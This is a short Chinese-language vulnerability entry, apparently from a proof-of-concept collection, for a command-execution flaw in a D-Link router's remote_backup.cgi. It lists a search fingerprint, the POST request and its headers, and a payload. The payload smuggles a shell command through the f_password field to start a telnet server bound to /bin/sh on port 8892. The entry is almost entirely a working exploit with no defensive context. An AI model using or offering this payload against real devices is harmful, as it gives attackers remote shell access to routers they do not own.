# D-Linkremote_backup.cgi存在命令执行漏洞

- **系统**：D-Linkremote_backup.cgi　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`"D-Link-DIR"`
- **请求**：`POST /cgi-bin/remote_backup.cgi HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`X-Requested-With: XMLHttpRequest`　`Content-Length: 276`　`Cookie: username=admin`　`Priority: u=0`

**请求体 / payload**
```
cmd=cgi_set_rsync_server&f_password=';utelnetd -p 8892 -l /bin/sh;'&f_onoff=1
```
- **预期**：200　|　—